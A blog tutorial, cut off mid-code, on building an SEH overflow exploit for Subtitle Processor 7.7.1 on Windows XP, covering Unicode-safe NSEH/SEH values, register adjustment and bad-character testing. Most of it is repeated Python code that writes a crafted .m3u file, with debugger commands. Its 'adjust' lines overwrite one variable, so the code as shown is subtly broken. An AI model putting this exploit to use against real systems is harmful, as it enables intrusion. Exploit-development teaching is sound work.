---
layout: post
title: Unicode Exploits
date: '2012-10-28T04:44:00.000-07:00'
author: thetekwizz
tags: 
modified_time: '2015-04-04T19:08:14.524-07:00'
thumbnail: http://4.bp.blogspot.com/-xCIkdTatGRo/UIxYp_pBo9I/AAAAAAAAABg/QaGsHh2NsoQ/s72-c/Windows+XP+Professional+SP2+-+VMware+Player_001.png
blogger_id: tag:blogger.com,1999:blog-1094392735627525300.post-9049469818391321473
blogger_orig_url: https://tekwizz123.blogspot.com/2012/10/unicode-exploits.html
---

<h2><div style="text-align: center;"><u>Subtitle Processor 7.7.1 Exploitation: An In Depth Tutorial&nbsp;</u></div><u><div style="text-align: center;"><u>on Unicode Exploitation With Egghunters</u></div></u></h2><div style="text-align: center;"><u><br /></u></div><h3><u>Prerequisites</u></h3><div><ul><li>Windows XP SP3 (latest&nbsp;updates can be installed if you want, doesn't really matter for this exploit)</li><li>DEP disabled on Windows XP SP3 (this is the default setting but if you have changed it you will need to change it back)</li><li>Immunity Debugger with mona.py installed in it.</li><ul><li>Immunity Debugger:&nbsp;<a href="http://www.immunitysec.com/products-immdbg.shtml">http://www.immunitysec.com/products-immdbg.shtml</a></li><li>mona.py:&nbsp;<a href="http://redmine.corelan.be/projects/mona">http://redmine.corelan.be/projects/mona</a></li></ul><li>Understanding of SEH exploits and some previous practice with them.</li><li>Some understanding of egghunters and how they are used in exploits.</li><li>A hell of a lot of patience.</li><li>The ability to search for things you don't understand.</li></ul><div>As always, if you don't understand something, first try and see if someone hasn't already answered the question online already. If you still can't find the answer then you can leave a comment below or email me on tekwizz123@gmail.com.</div></div><div><br /></div><h3><u>Starting Out</u></h3><div>You can find the exploit details at&nbsp;<a href="http://www.exploit-db.com/exploits/17217/">http://www.exploit-db.com/exploits/17217/</a>&nbsp;along with a link to download the vulnerable program or just click this link which goes to the same thing: &nbsp;http://www.exploit-db.com/wp-content/themes/exploit/applications/aaea2a1dbeaf6ca7c394acbba93461d9-SubtitleProcessor771.zip</div><div><br /></div><div>Ok with both of those installed go through the installation and just accept the defaults. Once done load the program up in Immunity Debugger (keep holding down SHIFT + F9 until program opens):</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-xCIkdTatGRo/UIxYp_pBo9I/AAAAAAAAABg/QaGsHh2NsoQ/s1600/Windows+XP+Professional+SP2+-+VMware+Player_001.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-xCIkdTatGRo/UIxYp_pBo9I/AAAAAAAAABg/QaGsHh2NsoQ/s640/Windows+XP+Professional+SP2+-+VMware+Player_001.png" height="363" width="640" /></a></div><div><br /></div><div><br /></div><div>Ok now that we have the program opened we will create a simple little test exploit for this baby shall we?</div><div><br /></div><div><br /></div><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 6000<br />exploit = junk<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><div style="text-align: left;"><u><br /></u></div><div style="text-align: left;">Which looks like this in my VM:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-nupnyQsgwZI/UIxZsSMM9dI/AAAAAAAAABo/gWJyxPVMYkQ/s1600/Windows+XP+Professional+SP2+-+VMware+Player_002.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-nupnyQsgwZI/UIxZsSMM9dI/AAAAAAAAABo/gWJyxPVMYkQ/s640/Windows+XP+Professional+SP2+-+VMware+Player_002.png" height="364" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Ok so now we need to compile this with the command:</div><div style="text-align: left;"><br /></div><blockquote class="tr_bq">python *dir to python script*\*whatever the script was named*</blockquote><br />Then we load up the resulting subtitle.m3u file by doing:<br /><br /><ol><li>Click on the File icon</li><li>Click on playlist</li><li>Navigate to the .m3u file we created.</li><li>Click open.</li></ol><br />You should get something that looks like this:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-wPYknSSvkNA/UIxbn2PJxPI/AAAAAAAAACA/5V8P-IlIfJE/s1600/Windows+XP+Professional+SP2+-+VMware+Player_004.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-wPYknSSvkNA/UIxbn2PJxPI/AAAAAAAAACA/5V8P-IlIfJE/s640/Windows+XP+Professional+SP2+-+VMware+Player_004.png" height="364" width="640" /></a></div><br /><br />You should notice 3 things (sorry these are not clearly shown in the photo, just click on that registers button on the top of the upper right panel to view the registers clearly)<br /><br /><ol><li>EAX appears to be overwritten with our string that has now been transformed into Unicode.</li><li>ESI also seems to be subject to a similar overwrite.</li><li>The SEH handler has been overwritten with our string</li></ol><div>Looking at the SEH handler:</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-ielJFvZfpSQ/UIxccDRZiHI/AAAAAAAAACI/eu6YngAY4t8/s1600/Windows+XP+Professional+SP2+-+VMware+Player_005.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-ielJFvZfpSQ/UIxccDRZiHI/AAAAAAAAACI/eu6YngAY4t8/s640/Windows+XP+Professional+SP2+-+VMware+Player_005.png" height="364" width="640" /></a></div><div><br /></div><div><br /></div><div>However we notice something rather peculiar about this exploit. Instead of the SEH handler being overwritten with \x41\x41\x41\x41 as we expected, it is instead overwritten with \x00\x41\x00\x41. WTF? How the heck? Let me explain.</div><div><br /></div><h3><u>The Peculiarities of Unicode: Character Restriction</u></h3><div>Basically what happens is that Unicode expands our characters out. For example:</div><div><br /></div><blockquote class="tr_bq">\x41 in hex becomes \x00\x41 in Unicode.</blockquote><blockquote><br />Similarly something like \x7f will be expanded out to be \x00\x7f in Unicode.</blockquote><br />A full list of hex to Unicode translations can be found on this website (interestingly enough I haven't found many website for this, but this seems to have all of them)<br /><br /><blockquote class="tr_bq"><a href="http://www.utf8-chartable.de/unicode-utf8-table.pl">http://www.utf8-chartable.de/unicode-utf8-table.pl</a></blockquote><h3><u><br /></u></h3><h3><u>Finding Offsets to NSEH and SEH</u></h3>&nbsp;<span style="font-weight: normal;">Ok so with that out the way we now need to figure out the offsets to NSEH and SEH. To do this we will use mona.py. Simply type in the following in the small white box at the bottom of Immunity and hit enter:</span><br /><span style="font-weight: normal;"><br /></span><br /><blockquote class="tr_bq"><span style="font-weight: normal;">!mona pc 6000</span></blockquote>This will generate a metasploit pattern of 6000 bytes. Open the pattern.txt that it creates which will be placed in the folder that you specified on start up. If you don't know what that is you can change it with:<br /><br /><blockquote class="tr_bq"><span style="background-color: white; color: #484848; font-family: monospace; font-size: 12px;">!mona config -set workingfolder&nbsp;C:\logs</span></blockquote>(Thanks for corelanc0d3r for providing this information on the front page of his download page)<br /><br /><br />Ok open it up and copy over the string into the exploit code. It should look like this:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-X6HesxqW3h4/UIxf_Mo_dEI/AAAAAAAAACY/8l8GRxeMCH0/s1600/Windows+XP+Professional+SP2+-+VMware+Player_006.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-X6HesxqW3h4/UIxf_Mo_dEI/AAAAAAAAACY/8l8GRxeMCH0/s640/Windows+XP+Professional+SP2+-+VMware+Player_006.png" height="364" width="640" /></a></div><div style="text-align: center;">&nbsp;The mona.py pattern creation.</div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-vzg1tcbYAs0/UIxgaD7sKyI/AAAAAAAAACg/JkwFYBdgqDk/s1600/Windows+XP+Professional+SP2+-+VMware+Player_007.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-vzg1tcbYAs0/UIxgaD7sKyI/AAAAAAAAACg/JkwFYBdgqDk/s640/Windows+XP+Professional+SP2+-+VMware+Player_007.png" height="364" width="640" /></a></div><div style="text-align: center;">&nbsp;How the exploit should now look.</div><div style="text-align: center;"><br /></div><div style="text-align: left;">Ok so now we need to generate the .m3u file again and load it up in the program. When the program crashes with the new file it should look like this:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-8XVGz_6Dh1o/UIxg8kV8UTI/AAAAAAAAACo/lbabhFFhHag/s1600/Windows+XP+Professional+SP2+-+VMware+Player_008.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-8XVGz_6Dh1o/UIxg8kV8UTI/AAAAAAAAACo/lbabhFFhHag/s640/Windows+XP+Professional+SP2+-+VMware+Player_008.png" height="364" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Now what we could do is do pattern_create to find out the offset but I prefer to use mona.py and is handy feature called "findmsp". To do this type in:</div><div style="text-align: left;"><br /></div><blockquote class="tr_bq">!mona findmsp</blockquote>If we look at the result we should see a bunch of output. We are only interested in this line though:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-PdNO1Mjnvmk/UIxh9cCsHcI/AAAAAAAAACw/xt_H9gd-Tlo/s1600/Windows+XP+Professional+SP2+-+VMware+Player_009.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-PdNO1Mjnvmk/UIxh9cCsHcI/AAAAAAAAACw/xt_H9gd-Tlo/s640/Windows+XP+Professional+SP2+-+VMware+Player_009.png" height="364" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><br /></div><div class="separator" style="clear: both; text-align: left;">This tells us that the NSEH handler was overwritten 4076 bytes in. Now in&nbsp;actuality&nbsp;the NSEH handler is written 4078 bytes in.&nbsp;I'm&nbsp;not sure what causes this and if you want you can use the following code with only 4076 bytes and see the difference but for the sake of space I will not recreate it here.</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Anyway, we now change our code to this:</div><div class="separator" style="clear: both; text-align: left;"><br /></div><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "B" * 2<br />seh = "C" * 2<br />exploit = junk + nseh + seh<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote>When we compile this code and run it again we should see this when we look at the SEH chain:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-uFSYzjKHZfA/UIxj9DQiHOI/AAAAAAAAAC4/RdC6QccXefs/s1600/Windows+XP+Professional+SP2+-+VMware+Player_010.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-uFSYzjKHZfA/UIxj9DQiHOI/AAAAAAAAAC4/RdC6QccXefs/s640/Windows+XP+Professional+SP2+-+VMware+Player_010.png" height="364" width="640" /></a></div><div style="text-align: center;">The SEH handler has been overwritten with our C's or \x43 in hex</div><div style="text-align: center;"><br /></div><div style="text-align: left;">We now have full control over SEH and NSEH :) But we will see this is only part of the exploit done.</div><div style="text-align: left;"><br /></div><h3><u>Dealing with Hell: Getting correct values into NSEH and SEH</u></h3><div>And now we come to the part that is&nbsp;probably&nbsp;the single section of this exploit that makes it so dang difficult. What we need to do next is so confusing that even I do not fully understand it myself. However I will try to do my best to explain it:</div><div><br /></div><div>Basically because of the Unicode expansion of bytes, we cannot simply replace NSEH with a 4 byte jump as per what we normally do to get out of the little trap zone of death. Oh no. In&nbsp;Unicode&nbsp; we must walk through little pointy zone of death and hope little pointy zone of death doesn't decide to kill us along the way.&nbsp;</div><div><br /></div><div>Essentially, because we can't do the jump we must fill NSEH will 2 bytes that when expanded will be transformed into harmless executable instructions in memory. This is harder than it seems. But its not the end of the pain.</div><div><br /></div><div>To make things even more difficult we must also fill SEH with an address that points to a POP POP RET or a similar instruction (read up on SEH exploits if you don't get this). However not only must this address point to this, but the parts that make up the address must be executable when expanded in memory.</div><div><br /></div><div>So...yeah. This is what makes this exploit general all around hell (mostly...more pain to come later).</div><div><br /></div><div>To generate Unicode compatible pointers for overwriting SEH we do the following once the program has fully loaded:</div><div><br /></div><blockquote class="tr_bq">!mona seh -cp unicode</blockquote>This will output a file called seh.txt with all of the pointers. Which in my case was 50 pointers. *sigh* And only one of them actually works from what I have found. *sigh*<br /><br />Anyway this is the pointer you need to overwrite SEH with:<br /><br /><blockquote class="tr_bq">0x004600eb&nbsp;</blockquote><br />We will change our exploit to&nbsp;accommodate&nbsp;this:<br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "B" * 2<br />seh = "\xeb\x46"<br />exploit = junk + nseh + seh<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><blockquote class="tr_bq"></blockquote><br />I have looked through that list of 50 pointers and found that this one occurs about 25-30 pointers into the list. So basically you would of had to test 30 invalid pointers to find one that would work. This is where the manual work comes into play big time for this exploit.<br /><br />As for NSEH its relatively simple. I can't explain how they came up with this (cause I sure as hell didn't think of it first) but it works wonderfully and actually makes perfect sense.<br /><br />NSEH should be:<br /><br /><blockquote class="tr_bq">\x61\x62</blockquote>Why? Very good question.&nbsp;Basically&nbsp;in memory this expands out to this:<br /><br /><blockquote class="tr_bq">61 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; POPAD</blockquote><blockquote class="tr_bq">006200 &nbsp; &nbsp; &nbsp; &nbsp; ADD BYTE PTR DS:[EDX], AH</blockquote>Basically the first instruction will "pop all double-word (32-bit) registers from the stack" (definition&nbsp;taken from&nbsp;<a href="https://en.wikipedia.org/wiki/X86_instruction_listings">https://en.wikipedia.org/wiki/X86_instruction_listings</a>)<br /><br />This helps to set all values in the registers to valid addresses so that when do manipulation on them later on they don't point to invalid addresses such as 0x0000000000.<br /><br /><h3><u>That Second Instruction: More Than Meets the Eye</u></h3>The second instruction is really what is important to us though. For the purposes of our exploit this simply acts as a NOP instruction. What it does is take the higher two bytes of AX and place them into the address pointed to by EDX. This does nothing in our exploit as EDX does not point to any part of memory that we care about and is thus this can be used as a NOP between instructions.<br /><br />This will come in handy in a sec. For now lets just make the changes to our exploit and double check that it works fine:<br /><br /><br /><br /><blockquote class="tr_bq"></blockquote><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />junk2 = "\x90" * (6000 - len(nseh+seh))<br />exploit = junk + nseh + seh + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><br />* Note: I'm not sure why the SEH part has to be done 2 times over. Something I'm still looking into. *<br /><br />If all works fine we should see the following:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-WgXxvAocmFo/UIxwEdDTN4I/AAAAAAAAADI/u3dgVC2VrCA/s1600/Windows+XP+Professional+SP2+-+VMware+Player_011.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-WgXxvAocmFo/UIxwEdDTN4I/AAAAAAAAADI/u3dgVC2VrCA/s640/Windows+XP+Professional+SP2+-+VMware+Player_011.png" height="364" width="640" /></a></div><br />We can see that our SEH handler has been correctly overwritten. We now place a breakpoint on this address:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-pk5PmcQU3kY/UIxwGJHHm3I/AAAAAAAAADQ/XwDdW9MOr50/s1600/Windows+XP+Professional+SP2+-+VMware+Player_012.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-pk5PmcQU3kY/UIxwGJHHm3I/AAAAAAAAADQ/XwDdW9MOr50/s640/Windows+XP+Professional+SP2+-+VMware+Player_012.png" height="364" width="640" /></a></div><br /><br />And then if we continue we see this:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-Z0ygYNK9OY8/UIxwqyNnbvI/AAAAAAAAADY/ZqTBjLAvKbg/s1600/Windows+XP+Professional+SP2+-+VMware+Player_013.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-Z0ygYNK9OY8/UIxwqyNnbvI/AAAAAAAAADY/ZqTBjLAvKbg/s640/Windows+XP+Professional+SP2+-+VMware+Player_013.png" height="364" width="640" /></a></div><br />YAY :) So we look like we are getting there :)<br /><br /><h3><u>Adjusting Them Registerrrrs</u></h3><div>However we see a small problem:</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-SDZJOHbdEJI/UIxzetFB-BI/AAAAAAAAADo/uUlFArqhsqs/s1600/Windows+XP+Professional+SP2+-+VMware+Player_014.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-SDZJOHbdEJI/UIxzetFB-BI/AAAAAAAAADo/uUlFArqhsqs/s640/Windows+XP+Professional+SP2+-+VMware+Player_014.png" height="364" width="640" /></a></div><div><br /></div><div><br /></div><div>We only have 38F bytes or 911/2 = 455.5 bytes for our shellcode.</div><div><br /></div><div>Now you may think this is not a problem, however consider the following:</div><div><ol><li>We still need to encode our payload into Unicode. The additional instructions that will decode our payload from&nbsp;Unicode&nbsp;into the proper instructions that we want will take up extra space.</li><li>In order for this&nbsp;Unicode&nbsp;decoder to work (we will be using alpha2) we need to point a register to the beginning of our shellcode. Atm most of our registers point to various locations within our buffer but not to the beginning of the buffer itself. However EBX seems to point to the beginning so we can use this. (Note if it didn't we would have to manually adjust it. You can see how to do this at&nbsp;<a href="http://fuzzysecurity.com/tutorials/expDev/5.html">http://fuzzysecurity.com/tutorials/expDev/5.html</a>&nbsp;)</li></ol><div>Which brings us to the problem of adjusting the registers so that one of our registers point to the beginning of our shellcode. We also realize that we are going to need an egghunter to find a full copy of our payload in memory that doesn't cross a memory border. This egghunter will also need to be encoded in&nbsp;Unicode&nbsp;in order for it to work properly.<br /><br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br /><br />Well when I say the beginning of the shellcode I really mean 12 bytes into the shellcode. Again this won't be repeated here but you can check this for yourself if you want. To account for this we will add in another section to&nbsp;accommodate&nbsp;&nbsp;for this:<br /><br />buffer = "\x62" * 12<br /><br />Our new exploit looks like this:<br /><br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= "\x90" * (6000 - len(junk+nseh+seh+adjust+buffer))<br /><br /><br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><br /><br />The first of these instructions will absorb the \x00 from the \xc3 instruction and turn into our NOP instruction. The next 11 will not be executed and turn into \x62\x00:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-IWdfeW7EiDY/UIx6uplkZzI/AAAAAAAAAD4/i5OvzZatjmk/s1600/Windows+XP+Professional+SP2+-+VMware+Player_015.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-IWdfeW7EiDY/UIx6uplkZzI/AAAAAAAAAD4/i5OvzZatjmk/s640/Windows+XP+Professional+SP2+-+VMware+Player_015.png" height="378" width="640" /></a></div><br /></div></div><div><u><br /></u>If all goes well when you execute the RETN instruction you should hit the first "\x90" and the display should look similar to mine:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-cV0wjzW78x4/UIx9hNkZufI/AAAAAAAAAEI/Tpq0cpAQajA/s1600/Windows+XP+Professional+SP2+-+VMware+Player_016.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-cV0wjzW78x4/UIx9hNkZufI/AAAAAAAAAEI/Tpq0cpAQajA/s640/Windows+XP+Professional+SP2+-+VMware+Player_016.png" height="368" width="640" /></a></div><br /><br /><h3><u>Finding Bad Characters</u></h3></div><div>Next we need to identify bad characters that will cause our exploit to fail. To do this do the following:<br /><br /><br /><ol><li>Download generatecodes.pl from&nbsp;<a href="http://exploit.co.il/wp-content/uploads/2010/05/generatecodes.txt">http://exploit.co.il/wp-content/uploads/2010/05/generatecodes.txt</a></li><li>Edit the code and remove the line:</li><ol><li><span style="white-space: pre-wrap;">GetOptions('help|?|' =&gt; \$help);</span></li></ol><li><span style="white-space: pre-wrap;">Run the code with Perl and put the resulting output into a file.</span></li></ol><div><span style="white-space: pre-wrap;">Ok once you have done that its a simple matter of copy and pasting each line in place of the "\x90"s, then dumping the code in memory and checking that none of the bytes are corrupted or are missing/modified.</span></div><div><span style="white-space: pre-wrap;"><br /></span></div><div><span style="white-space: pre-wrap;">Here is the list of codes in case the code doesn't work for you:</span></div><div><blockquote class="tr_bq">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e"<br />"\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d"<br />"\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c"<br />"\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b"<br />"\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"<br />"\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"<br />"\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"<br />"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77"<br />"\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86"<br />"\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95"<br />"\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4"<br />"\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3"<br />"\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"<br />"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"<br />"\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"<br />"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"<br />"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe"<br />"\xff"</blockquote></div><div><br /></div><blockquote class="tr_bq"><br /></blockquote><div><span style="white-space: pre-wrap;">So this is what you would change your code to for the first run:</span></div><div><span style="white-space: pre-wrap;"><br /></span></div><blockquote class="tr_bq"><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e"<br /><br /><br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote></blockquote>You should quickly realize that in that line \x00 is not a valid character. Remove it and try again.<br /><br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e"<br /><br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><br /><br />We see we still have a problem. Lets split the string up into two segments of equal length and try the first segment.<br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x01\x02\x03\x04\x05\x06\x07\x08"<br /><br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote>This appears to work. All of the bytes appear in memory correctly and none of them seem to have been changed at all (note that the \x00 's that you see before and after each byte in this string are normal as the program will translate these bytes into Unicode)<br /><br />Lets try with the other string again:<br /><br />#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x09\x0a\x0b\x0c\x0d\x0e"<br /><br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()<br /><br />Woops. Still a problem. Split it up again.<br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = 